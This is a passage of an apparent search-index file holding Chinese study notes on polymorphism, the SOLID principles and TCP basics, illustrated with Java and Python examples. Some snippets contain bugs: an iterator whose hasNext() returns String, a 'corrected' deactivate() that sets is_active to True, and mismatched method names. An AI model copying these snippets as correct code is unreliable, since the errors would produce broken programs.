\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u7236\u7c7b\u5bf9\u8c61\u53ef\u4ee5\u5f15\u7528\u5b50\u7c7b\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u5c06Cat\u4f20\u9012\u7ed9Animal\uff0c\u7136\u540e\u5c31\u4f1a\u4f7f\u7528\u5b50\u7c7b\u7684eat\u65b9\u6cd5\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u591a\u6001\u3002</p> <p><pre><code>public interface Iterator {\n    String hasNext();\n    String next();\n}\npublic class Array implements Iterator {\n    private String[] data;\n    public String hasNext() { ... } \n    public String next() { ... } \n}\npublic class LinkedList implements Iterator {\n    private LinkedListNode head;\n    public String hasNext() { ... } \n    public String next() { ... } \n}\npublic class Demo {\n    private static void print(Iterator iterator) {\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n    public static void main(String[] args) {\n        Iterator arrayIterator = new Array();\n        print(arrayIterator);\n        Iterator linkedListIterator = new LinkedList();\n        print(linkedListIterator);\n    }\n}\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0cIterator\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53ef\u4ee5\u904d\u5386\u96c6\u5408\u6570\u636e\u7684\u8fed\u4ee3\u5668\u3002Array\u548cLinkedList\u90fd\u5b9e\u73b0\u4e86\u5b83\uff0c\u7136\u540e\u901a\u8fc7\u4f20\u9012\u4e0d\u540c\u7684\u5b9e\u73b0\u7c7b\u5230print\u51fd\u6570\u4e2d\uff0c\u6765\u652f\u6301\u52a8\u6001\u8c03\u7528\u4e0d\u540c\u7684next()\u548chasNext()\u5b9e\u73b0\u3002</p> <p><pre><code>class Logger:\n    def record(self):\n        print(\"I write a log into file.\")\nclass DB:\n    def record(self):\n        print(\"I insert data into db.\")\ndef test(recorder):\n    recorder.record()\ndef demo():\n    logger = Logger()\n    db = DB()\n    test(logger)\n    test(db)\n</code></pre> \u9e2d\u5b50\u7c7b\u578b\u5b9e\u73b0\u591a\u6001\u7684\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u53ea\u8981\u4ed6\u4eec\u90fd\u5b9a\u4e49\u4e86record\u65b9\u6cd5\uff0c\u4f20\u5165test\u65b9\u6cd5\u65f6\u5c31\u53ef\u4ee5\u8c03\u7528\u76f8\u5e94\u7684record\u65b9\u6cd5\u3002</p> <p>\u591a\u6001\u7279\u6027\u4e3b\u8981\u80fd\u63d0\u5347\u4ee3\u7801\u7684\u53ef\u6269\u5c55\u6027\u548c\u590d\u7528\u6027\uff0c\u4f8b\u5982Iterator\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u6539\u53d8\u539f\u6709\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u6dfb\u52a0\u5176\u4ed6\u7684\u6570\u636e\u7ed3\u6784\u50cfHashMap\u7b49\uff0c\u4e5f\u540c\u6837\u80fd\u591f\u4f20\u5165print()\u51fd\u6570\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u591a\u6001\u7279\u6027\uff0c\u6211\u4eec\u53ef\u80fd\u8981\u5b9a\u4e49print(Array array)\u3001print(LinkedList linkedList)\u7b49\u3002</p>"},{"location":"other/oop/#solid","title":"SOLID","text":"<p>\u968f\u7740\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u53d1\u5c55\uff0c\u4eba\u4eec\u603b\u7ed3\u51fa\u4e86\u5f88\u591a\u8bbe\u8ba1\u539f\u5219\uff0c\u5176\u4e2d\u6700\u51fa\u540d\u7684\u5f53\u5c5eSOLID\uff0c\u5b83\u4ee3\u8868\u4e94\u6761\u539f\u5219\u3002\u5982\u679c\u9075\u5faa\u8fd95\u6761\u8bbe\u8ba1\u539f\u5219\uff0c\u5c31\u66f4\u53ef\u80fd\u5199\u51fa\u53ef\u6269\u5c55\u3001\u6613\u4e8e\u4fee\u6539\u7684\u4ee3\u7801\u3002\u76f8\u53cd\uff0c\u5982\u679c\u4e0d\u65ad\u8fdd\u53cd\u5176\u4e2d\u7684\u4e00\u6761\u6216\u591a\u6761\u539f\u5219\uff0c\u90a3\u4e48\u5f88\u5feb\u4f60\u7684\u4ee3\u7801\u5c31\u4f1a\u53d8\u5f97\u4e0d\u53ef\u6269\u5c55\u3001\u96be\u4ee5\u7ef4\u62a4\u3002</p>"},{"location":"other/oop/#_7","title":"\u5355\u4e00\u804c\u8d23","text":"<p>\u5373Single Responsibility Principle\uff0c\u4e00\u4e2a\u7c7b\u6216\u8005\u6a21\u5757\u53ea\u8d1f\u8d23\u5b8c\u6210\u4e00\u4e2a\u804c\u8d23(\u6216\u529f\u80fd)\u3002\u8fd9\u4e2a\u539f\u5219\u770b\u4f3c\u4e0d\u592a\u96be\u7528\uff0c\u4f46\u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u5f80\u5f80\u5f88\u96be\u5224\u65ad\u4e00\u4e2a\u7c7b\u7684\u804c\u8d23\u662f\u5426\u662f\u5355\u4e00\u7684\u3002\u6bd4\u5982\u5728\u4e00\u4e2a\u793e\u4ea4\u4ea7\u54c1\u4e2d\uff0c\u6211\u4eec\u7528\u4e00\u4e2aUserInfo\u7c7b\u6765\u8bb0\u5f55\u7528\u6237\u7684\u4fe1\u606f: <pre><code>public class UserInfo{\n    private long userId;\n    private String username;\n    private String email;\n    private String telephone;\n    private String avatarUrl;\n    private String provinceOfAddress; // \u7701\n    private String cityOfAddress; // \u5e02\n    private String regionOfAddress; // \u533a\n    private String detailedAddress; // \u8be6\u7ec6\u5730\u5740\n    // ... \u7701\u7565\u5176\u4ed6\u5c5e\u6027\u548c\u65b9\u6cd5...\n}\n</code></pre> \u6211\u4eec\u53d1\u73b0\u770b\u4e0a\u53bb\u8fd9\u4e2a\u7c7b\u90fd\u662f\u548c\u7528\u6237\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u6240\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u662f\u57fa\u4e8e\u7528\u6237\u8fd9\u4e2a\u4e1a\u52a1\u6a21\u578b\u7684\uff0c\u5e94\u8be5\u662f\u6ee1\u8db3\u5355\u4e00\u804c\u8d23\u539f\u5219\u7684\u3002\u4f46\u8fd8\u6709\u4e00\u79cd\u89c2\u70b9\u8ba4\u4e3a\uff0c\u5730\u5740\u4fe1\u606f\u5728UserInfo\u4e2d\u6240\u5360\u6bd4\u91cd\u9ad8\uff0c\u53ef\u4ee5\u7ee7\u7eed\u62c6\u5206\u4e3a\u72ec\u7acb\u7684UserAddress\u7c7b\uff0c\u62c6\u5206\u4e4b\u540e\u804c\u8d23\u66f4\u52a0\u5355\u4e00\u3002\u54ea\u79cd\u89c2\u70b9\u662f\u5bf9\u7684\u5462\uff1f\u5b9e\u9645\u4e0a\u8fd8\u662f\u8981\u6839\u636e\u4e1a\u52a1\u6765\u786e\u5b9a\uff0c\u5982\u679c\u5730\u5740\u4fe1\u606f\u548c\u5176\u4ed6\u4fe1\u606f\u4e00\u6837\u53ea\u662f\u5c55\u793a\u7528\uff0c\u90a3\u653e\u5728UserInfo\u4e2d\u6ca1\u6709\u95ee\u9898\uff0c\u5982\u679c\u5730\u5740\u8fd8\u8981\u7528\u4e8e\u540e\u7eed\u7684\u6536\u8d27\u7b49\u573a\u666f\uff0c\u5c31\u5e94\u8be5\u72ec\u7acb\u6210\u4e00\u4e2a\u7c7b\u3002</p> <p>\u5982\u679c\u8fdd\u53cd\u5355\u4e00\u804c\u8d23\uff0c\u6709\u4ec0\u4e48\u574f\u5904\u5462\uff1f\u5047\u8bbe\u67d0\u4e2a\u7c7b\u5305\u542b\u4e8610\u591a\u4e2a\u529f\u80fd\u70b9\uff0c\u90a3\u610f\u5473\u7740\u7ef4\u62a4\u6210\u672c\u7684\u589e\u9ad8\uff0c\u6211\u4eec\u53ef\u80fd\u7ecf\u5e38\u53bb\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u4fee\u6539\u5b83\uff0c\u5bfc\u81f4\u4e0d\u540c\u7684\u529f\u80fd\u4e4b\u95f4\u76f8\u4e92\u5f71\u54cd\uff0c\u6b64\u5916\uff0c\u4e5f\u4e0d\u5229\u4e8e\u4ee3\u7801\u7684\u590d\u7528\u3002</p> <p>\u90a3\u662f\u5426\u4e3a\u4e86\u6ee1\u8db3\u5355\u4e00\u804c\u8d23\u539f\u5219\uff0c\u628a\u7c7b\u62c6\u7684\u8d8a\u7ec6\u8d8a\u597d\uff1f\u4f8b\u5982\u5f53\u524d\u6709\u4e00\u4e2aSerialization\u7c7b\u5b9e\u73b0\u4e00\u4e2a\u534f\u8bae\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u529f\u80fd: <pre><code>/**\n * Protocol format: identifier-string;{gson string}\n * For example: UEUEUE;{\"a\":\"A\",\"b\":\"B\"}\n */\npublic class Serialization {\n    private static final String IDENTIFIER_STRING = \"UEUEUE;\";\n    private Gson gson;\n    public Serialization() {\n        this.gson = new Gson();\n    }\n    public String serialize(Map&lt;String, String&gt; object) {\n        StringBuilder textBuilder = new StringBuilder();\n        textBuilder.append(IDENTIFIER_STRING);\n        textBuilder.append(gson.toJson(object));\n        return textBuilder.toString();\n    }\n    public Map&lt;String, String&gt; deserialize(String text) {\n        if (!text.startsWith(IDENTIFIER_STRING)) {\n            return Collections.emptyMap();\n        }\n        String gsonStr = text.substring(IDENTIFIER_STRING.length());\n        return gson.fromJson(gsonStr, Map.class);\n    }\n}\n</code></pre> \u4e3a\u4e86\u8ba9\u7c7b\u7684\u804c\u8d23\u66f4\u52a0\u5355\u4e00\uff0c\u6211\u4eec\u5bf9\u5b83\u8fdb\u4e00\u6b65\u62c6\u5206: <pre><code>public class Serializer {\n    private static final String IDENTIFIER_STRING = \"UEUEUE;\";\n    private Gson gson;\n    public Serializer() { \n        this.gson = new Gson();\n    }\n    public String serialize(Map&lt;String, String&gt; object) {\n        StringBuilder textBuilder = new StringBuilder();\n        textBuilder.append(IDENTIFIER_STRING);\n        textBuilder.append(gson.toJson(object));\n        return textBuilder.toString();\n    }\n}\n\npublic class Deserializer {\n    private static final String IDENTIFIER_STRING = \"UEUEUE;\";\n    private Gson gson;\n    public Deserializer() {\n        this.gson = new Gson();\n    }\n    public Map&lt;String, String&gt; deserialize(String text) {\n        if (!text.startsWith(IDENTIFIER_STRING)) {\n            return Collections.emptyMap();\n        }\n        String gsonStr = text.substring(IDENTIFIER_STRING.length());\n        return gson.fromJson(gsonStr, Map.class);\n    }\n}\n</code></pre> \u867d\u7136\u62c6\u5206\u4e4b\u540e\uff0c\u7c7b\u7684\u804c\u8d23\u66f4\u52a0\u5355\u4e00\u4e86\uff0c\u4f46\u4e5f\u5e26\u6765\u65b0\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u6211\u4eec\u5982\u679c\u4fee\u6539\u6570\u636e\u6807\u8bc6\"UEUEUE\"\u6539\u4e3a\"DFDFDF\"\uff0c\u6216\u8005\u5e8f\u5217\u5316\u65b9\u5f0f\u4eceJSON\u6539\u4e3aXML\uff0c\u90a3\u4e48\u4e24\u4e2a\u7c7b\u90fd\u9700\u8981\u505a\u4fee\u6539\uff0c\u4ee3\u7801\u7684\u5185\u805a\u6027\u6ca1\u6709\u539f\u6765\u7684\u9ad8\u4e86\uff0c\u53ef\u7ef4\u62a4\u6027\u53d8\u5dee\u4e86\u3002</p>"},{"location":"other/oop/#_8","title":"\u5f00\u95ed\u539f\u5219","text":"<p>\u5373Open Closed Principle\uff0c\u8868\u793a\u5bf9\u6269\u5c55\u5f00\u653e\u3001\u5bf9\u4fee\u6539\u5173\u95ed\uff0c\u5f53\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u529f\u80fd\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u5728\u5df2\u6709\u4ee3\u7801\u7684\u57fa\u7840\u4e0a\u6269\u5c55(\u65b0\u589e\u6a21\u5757\u3001\u7c7b\u3001\u65b9\u6cd5\u7b49)\uff0c\u800c\u975e\u4fee\u6539\u5df2\u6709\u4ee3\u7801(\u4fee\u6539\u6a21\u5757\u3001\u7c7b\u3001\u65b9\u6cd5\u7b49)\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u5728\u5199\u4e00\u4e2a\u722c\u866b\u7684\u5c0f\u7a0b\u5e8f\uff0c\u7528\u6237\u5bf9\u722c\u53d6\u7ed3\u679c\u4e2d\u5173\u4e8egithub\u7684\u5185\u5bb9\u611f\u5174\u8da3\uff0c\u56e0\u6b64\u4ee3\u7801\u53d8\u6210\u4e86\u8fd9\u6837: <pre><code>class HNTopPostsSpider:\n    # &lt;... \u5df2\u7701\u7565 ...&gt;\n    def fetch(self) -&gt; Generator[Post, None, None]:\n        # &lt;... \u5df2\u7701\u7565 ...&gt;\n        for item in items:\n            # &lt;... \u5df2\u7701\u7565 ...&gt;\n            link = node_title.get('href')\n            # \u53ea\u5173\u6ce8\u6765\u81ea github.com \u7684\u5185\u5bb9\n            if 'github' in link.lower():\n                yield Post(... ...)\n</code></pre> \u8fd9\u4e48\u505a\u770b\u4f3c\u5b8c\u6210\u4e86\u529f\u80fd\uff0c\u4f46\u5982\u679c\u7528\u6237\u6539\u53d8\u4e86\u9700\u6c42\uff0c\u60f3\u5173\u6ce8\u6765\u81eatwitter\u7684\u5185\u5bb9\uff0c\u5c31\u5fc5\u987b\u8981\u4fee\u6539<code>if 'github' in link.lower()</code>\u8fd9\u6bb5\uff0c\u8fd9\u663e\u7136\u662f\u8fdd\u53cd\u5f00\u95ed\u539f\u5219\u7684\u3002\u90a3\u4e48\u5982\u4f55\u4fee\u6539\uff0c\u6709\u8fd9\u6837\u51e0\u79cd\u601d\u8def:</p> <p>\u5229\u7528\u7ee7\u627f\u4fee\u6539</p> <p>\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u7684\u5173\u952e\u70b9\u5728\u4e8e\uff0c\u627e\u5230\u7236\u7c7b\u4e2d\u4f1a\u53d8\u52a8\u7684\u90e8\u5206\uff0c\u5c06\u5176\u62bd\u8c61\u6210\u65b0\u7684\u65b9\u6cd5\u6216\u5c5e\u6027\uff0c\u6700\u7ec8\u5141\u8bb8\u5b50\u7c7b\u91cd\u5199\u6765\u6539\u53d8\u8fd9\u4e9b\u884c\u4e3a\u3002 <pre><code>class HNTopPostsSpider:\n    # &lt;... \u5df2\u7701\u7565 ...&gt;\n    def fetch(self) -&gt; Generator[Post, None, None]:\n        # &lt;... \u5df2\u7701\u7565 ...&gt;\n        for item in items:\n            # &lt;... \u5df2\u7701\u7565 ...&gt;\n            post = Post( ... ... )\n            # \u4f7f\u7528\u6d4b\u8bd5\u65b9\u6cd5\u6765\u5224\u65ad\u662f\u5426\u8fd4\u56de\u8be5\u5e16\u5b50\n            if self.interested_in_post(post):\n                yield post\n    def interested_in_post(self, post: Post) -&gt; bool:\n        return True\n\nclass GithubOnlyHNTopPostsSpider(HNTopPostsSpider):\n    def interested_in_post(self, post: Post) -&gt; bool:\n        return 'github' in post.link.lower()\n</code></pre> \u8fd9\u65f6\uff0c\u7528\u6237\u5982\u679c\u60f3\u8981\u6dfb\u52a0\u5176\u4ed6\u7f51\u7ad9\u5230\u611f\u5174\u8da3\u7684\u5185\u5bb9\uff0c\u53ea\u9700\u8981\u518d\u5199\u4e00\u4e2a\u7ee7\u627f\u7c7b\u5e76\u8986\u76d6<code>interested_in_post</code>\u65b9\u6cd5\u4e2d\u7684\u5185\u5bb9\u5373\u53ef\uff0c\u800c\u4e0d\u9700\u8981\u4fee\u6539\u7c7b\u672c\u8eab\u3002</p> <p>\u5229\u7528\u7ec4\u5408\u4e0e\u4f9d\u8d56\u6ce8\u5165\u4fee\u6539</p> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\uff0c\u5728\u6211\u4eec\u5bf9\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\uff0c\u901a\u8fc7\u53c2\u6570\u4f20\u5165\u4e00\u4e2a\u5e16\u5b50\u8fc7\u6ee4\u7684\u7b97\u6cd5\u5230\u5b9e\u4f8b\u4e2d\u3002 <pre><code>class PostFilter(metaclass=ABCMeta):\n    @abstractmethod\n    def validate(self, post: Post) -&gt; bool:\n        \"\"\"\u5224\u65ad\u5e16\u5b50\u662f\u5426\u5e94\u8be5\u88ab\u4fdd\u7559\"\"\"\n\nclass DefaultPostFilter(PostFilter):\n    def validate(self, post: Post) -&gt; bool:\n        return True\n\nclass HNTopPostsSpider:\n    def __init__(self, post_filter: Optional[PostFilter] = None):\n        self.post_filter = post_filter or DefaultPostFilter()\n    def fetch(self) -&gt; Generator[Post, None, None]:\n        # &lt;... \u5df2\u7701\u7565 ...&gt;\n        for item in items:\n            # &lt;... \u5df2\u7701\u7565 ...&gt;\n            post = Post( ... ... )\n            # \u4f7f\u7528\u6d4b\u8bd5\u65b9\u6cd5\u6765\u5224\u65ad\u662f\u5426\u8fd4\u56de\u8be5\u5e16\u5b50\n            if self.post_filter.validate(post):\n                yield post\n</code></pre> \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f1a\u4fdd\u7559\u6240\u6709\u7684\u7ed3\u679c\uff0c\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u9700\u6c42\u5b9a\u5236: <pre><code>class GithubTwitterFilter(PostFilter):\n    def validate(self, post: Post) -&gt; bool:\n        if 'github' in post.link.lower() or 'twitter' in post.link.lower():\n            return True\n        return False\n\ndef main():\n    crawler = HNTopPostsSpider(post_filter=GithubTwitterFilter())\n    crawler.fetch()\n</code></pre> \u6240\u4ee5\u901a\u8fc7\u62bd\u8c61\u51fa\u8fc7\u6ee4\u7b97\u6cd5\uff0c\u4ee5\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u4f20\u5165\u5b9e\u4f8b\u4e5f\u80fd\u5b9e\u73b0\u5f00\u95ed\u539f\u5219\u3002</p> <p>\u4f7f\u7528\u6570\u636e\u9a71\u52a8\u6765\u4fee\u6539</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u7684\u6838\u5fc3\u601d\u60f3\u5728\u4e8e\uff0c\u5c06\u7ecf\u5e38\u53d8\u52a8\u7684\u4e1c\u897f\uff0c\u4ee5\u6570\u636e\u7684\u65b9\u5f0f\u62bd\u79bb\u51fa\u6765\uff0c\u9700\u6c42\u53d8\u52a8\u65f6\u53ea\u53bb\u6539\u52a8\u6570\u636e\u3002\u548c\u4f9d\u8d56\u6ce8\u5165\u5f88\u50cf\uff0c\u53ea\u4e0d\u8fc7\u4f9d\u8d56\u6ce8\u5165\u4f20\u5165\u7684\u662f\u7c7b\uff0c\u8fd9\u4e2a\u4f20\u5165\u7684\u662f\u6570\u636e\u3002 <pre><code>class HNTopPostsSpider:\n    def __init__(self,\n                 filter_by_link_keywords: Optional[List[str]] = None):\n        self.filter_by_link_keywords = filter_by_link_keywords\n    def fetch(self) -&gt; Generator[Post, None, None]:\n        # &lt;... \u5df2\u7701\u7565 ...&gt;\n        for item in items:\n            # &lt;... \u5df2\u7701\u7565 ...&gt;\n            post = Post( ... ... )\n            if self.filter_by_link_keywords is None:\n                yield post\n            # \u5f53 link \u4e2d\u51fa\u73b0\u4efb\u610f\u4e00\u4e2a\u5173\u952e\u8bcd\u65f6\uff0c\u8fd4\u56de\u7ed3\u679c\n            elif any(keyword in post.link for keyword in self.filter_by_link_keywords):\n                yield post\n\ndef main():\n    # link_keywords = None\n    link_keywords = [\n        'github.com',\n        'twitter.com'\n    ]\n    crawler = HNTopPostsSpider(filter_by_link_keywords=link_keywords)\n    crawler.fetch()\n</code></pre> \u8fd9\u79cd\u65b9\u5f0f\u6ca1\u6709\u6dfb\u52a0\u5176\u4ed6\u7684\u7c7b\uff0c\u663e\u5f97\u66f4\u7b80\u6d01\uff0c\u4f46\u4e5f\u540c\u6837\u5e26\u6765\u4e86\u6269\u5c55\u6027\u4e0d\u5f3a\u7684\u95ee\u9898\uff0c\u4f8b\u5982\u5982\u679c\u9700\u8981\u5b9a\u4e49\u4ee5<code>.com</code>\u7ed3\u5c3e\u7684\u8fc7\u6ee4\u6761\u4ef6\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\u3002</p>"},{"location":"other/oop/#_9","title":"\u91cc\u6c0f\u66ff\u6362","text":"<p>\u91cc\u6c0f\u66ff\u6362\u539f\u5219\u662f\u4e00\u6761\u975e\u5e38\u5177\u4f53\u7684\u3001\u548c\u7ee7\u627f\u6709\u5173\u7684\u539f\u5219\uff0c\u662f\u7528\u5b83\u7684\u53d1\u660e\u8005Liskov\u547d\u540d\u7684\uff0c\u5177\u4f53\u6307\u5728\u4f60\u4f7f\u7528\u7ee7\u627f\u65f6\uff0c\u5b50\u7c7b\u5bf9\u8c61\u5e94\u8be5\u80fd\u591f\u66ff\u4ee3\u7236\u7c7b\u5bf9\u8c61\u7684\u4f7f\u7528\uff0c\u8fd8\u4e0d\u7834\u574f\u7a0b\u5e8f\u672c\u8eab\u7684\u529f\u80fd\u3002</p> <p>\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50: <pre><code>class User(Model):\n    def __init__(self, username: str):\n        self.username = username\n    def deactivate(self):\n        # \u505c\u7528\u5f53\u524d\u7528\u6237\n        self.is_active = False\n        self.save()\n\nclass Admin(User):\n    def deactivate(self):\n        # \u7ba1\u7406\u5458\u7528\u6237\u4e0d\u5141\u8bb8\u88ab\u505c\u7528\n        raise RuntimeError('admin can not be deactivated!')\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u4e2dAdmin\u9700\u8981\u7684\u529f\u80fd\u5927\u591aUser\u5df2\u7ecf\u5177\u5907\uff0c\u6240\u4ee5\u5b83\u7ee7\u627f\u4e86User\uff0c\u5e76\u91cd\u5199\u4e86User\u7684\u5c11\u91cf\u884c\u4e3a\uff0c\u8fd9\u662f\u7ee7\u627f\u7684\u5178\u578b\u7528\u6cd5\u3002\u8fd9\u6709\u4ec0\u4e48\u95ee\u9898\u5462\uff1f\u5047\u8bbe\u6211\u4eec\u73b0\u5728\u9700\u8981\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u6279\u91cf\u505c\u7528\u7528\u6237: <pre><code>def deactive_users(users:Iterable[User]):\n    for user in users:\n        user.deactive()\n</code></pre> \u90a3\u4e48\u6211\u4eec\u5982\u679c\u4f20\u5165\u4e00\u4e2a[User(\"a\")\u3001Admin(\"b\")]\u8fd9\u6709\u7684\u5bf9\u8c61\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u5728\u8fd9\u4e2a\u51fd\u6570\u4e2d\uff0c\u5b50\u7c7b\u65e0\u6cd5\u66ff\u4ee3\u7236\u7c7b\u7684\u4f7f\u7528\uff0c\u8fdd\u80cc\u4e86\u91cc\u6c0f\u66ff\u6362\u539f\u5219\u3002</p> <p>\u5982\u4f55\u53bb\u4fee\u6539\u5462\uff1f\u5982\u679c\u6211\u4eec\u5728deactive_users\u51fd\u6570\u4e2d\u6dfb\u52a0<code>if isinstance(user, Admin)</code>\u8fd9\u6837\u7684\u5224\u65ad\u663e\u7136\u662f\u4e0d\u5408\u9002\u7684\uff0c\u672a\u6765\u5982\u679c\u6709\u66f4\u591a\u7684\u9700\u8981\u4e0d\u5141\u8bb8\u88ab\u505c\u7528\u7684User\u5b50\u7c7b\uff0c\u4f8b\u5982VIP\u3001\u516c\u53f8\u5458\u5de5\u7b49\uff0c\u53c8\u9700\u8981\u4fee\u6539\u8be5\u51fd\u6570\uff0c\u8fd9\u5c31\u8fdd\u53cd\u4e86\u5f00\u95ed\u539f\u5219\u3002\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u4fee\u6539: <pre><code>class User(Model):\n    def __init__(self, username: str):\n        self.username = username\n    def allow_deactivate(self) -&gt; bool:\n        # \u662f\u5426\u5141\u8bb8\u88ab\u505c\u7528\n        return True\n    def deactivate(self):\n        self.is_active = True\n        self.save()\n\nclass Admin(User):\n    def allow_deactivate(self) -&gt; bool:\n        # \u7ba1\u7406\u5458\u7528\u6237\u4e0d\u5141\u8bb8\u88ab\u505c\u7528\n        return False\n\ndef deactivate_users(users: Iterable[User]):\n    for user in users:\n        if not user.allow_deactivate():\n            logger.info(f'user {user.username} does not allow deactivating, skip.')\n            continue\n        user.deactivate()\n</code></pre> \u4fee\u6539\u540e\u7684\u4ee3\u7801\uff0c\u5b50\u7c7b\u53ef\u4ee5\u66ff\u4ee3\u7236\u7c7b\u7684\u4f7f\u7528\uff0c\u4e5f\u7b26\u5408\u4e86\u5f00\u95ed\u539f\u5219\u3002\u603b\u7ed3\u6765\u8bf4\uff0c\u6211\u4eec\u5e94\u8be5\u8ba9\u5b50\u7c7b\u91cd\u5199\u7236\u7c7b\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5b50\u7c7b\u65b9\u6cd5\u7684\u53c2\u6570\u7b7e\u540d\u548c\u7236\u7c7b\u5b8c\u5168\u4e00\u81f4\u6216\u8005\u6709\u66f4\u5bbd\u677e\uff0c\u5b50\u7c7b\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u548c\u7236\u7c7b\u4e00\u81f4\u3002</p>"},{"location":"other/oop/#_10","title":"\u63a5\u53e3\u9694\u79bb","text":""},{"location":"other/oop/#_11","title":"\u4f9d\u8d56\u53cd\u8f6c","text":""},{"location":"other/protocol/","title":"\u7f51\u7edc\u534f\u8bae","text":""},{"location":"other/protocol/#tcp","title":"TCP","text":"<p>TCP\u662f\u4e00\u79cd\u53ef\u9760\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u5f88\u591a\u5e94\u7528\u5c42\u534f\u8bae\u90fd\u4f9d\u8d56\u5b83\u3002</p>"},{"location":"other/protocol/#_2","title":"\u5305\u5934\u683c\u5f0f","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u6e90\u7aef\u53e3\u53f7\u548c\u76ee\u6807\u7aef\u53e3\u53f7\u7528\u6765\u786e\u5b9a\u53d1\u9001\u548c\u63a5\u6536\u6570\u636e\u7684\u53cc\u65b9\u3002</p> <p>\u5305\u7684\u5e8f\u53f7\u4e3a\u4e86\u89e3\u51b3\u5305\u7684\u5148\u540e\u987a\u5e8f\u95ee\u9898\uff0c\u786e\u8ba4\u5e8f\u53f7\u4e3a\u4e86\u786e\u8ba4\u53d1\u51fa\u53bb\u7684\u5305\u5bf9\u65b9\u662f\u5426\u5df2\u7ecf\u6536\u5230\uff0c\u5982\u679c\u6ca1\u6709\u6536\u5230\u5c31\u4f1a\u6709\u4e0d\u65ad\u91cd\u4f20\u673a\u5236\u6765\u786e\u4fdd\u4e0d\u4f1a\u4e22\u5305\u3002</p> <p>\u63a5\u4e0b\u6765\u662f\u4e00\u4e9b\u72b6\u6001\u4f4d\uff0c\u4f8b\u5982SYN\u8868\u793a\u53d1\u8d77\u4e00\u4e2a\u8fde\u63a5\uff0cACK\u662f\u56de\u590d\uff0cRST\u662f\u91cd\u65b0\u8fde\u63a5\uff0cFIN\u662f\u7ed3\u675f\u8fde\u63a5\u7b49\u3002TCP\u662f\u9762\u5411\u8fde\u63a5\u7684\uff0c\u56e0\u800c\u53cc\u65b9\u90fd\u8981\u7ef4\u62a4\u8fde\u63a5\u7684\u72b6\u6001\uff0c\u8fd9\u4e9b\u5e26\u72b6\u6001\u4f4d\u7684\u5305\u7684\u53d1\u9001\u4f1a\u5f15\u8d77\u53cc\u65b9\u72b6\u6001\u7684\u53d8\u66f4\u3002</p> <p>\u4e0b\u9762\u662f\u7a97\u53e3\u5927\u5c0f\uff0c\u56e0\u4e3aTCP\u8981\u505a\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\uff0c\u901a\u4fe1\u7684\u53cc\u65b9\u9700\u8981\u5404\u58f0\u660e\u4e00\u4e2a\u7a97\u53e3\u6765\u6807\u8bc6\u81ea\u5df1\u5f53\u524d\u7684\u6570\u636e\u5904\u7406\u80fd\u529b\u3002</p>"},{"location":"other/protocol/#_3","title":"\u4e09\u6b21\u63e1\u624b","text":"<p>TCP\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\uff0c\u8bf7\u6c42&gt;\u5e94\u7b54&gt;\u5e94\u7b54\u4e4b\u5e94\u7b54\uff0c\u6211\u4eec\u5e38\u79f0\u4e3a\u4e09\u6b21\u63e1\u624b\u3002\u4e5f\u7ecf\u5e38\u4f1a\u6709\u4eba\u95ee\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u662f\u4e24\u6b21\uff1f\u4e3a\u4ec0\u4e48\u4e0d\u662f\u56db\u6b21\uff1f</p> <p>\u8fde\u63a5\u8fc7\u7a0b</p> 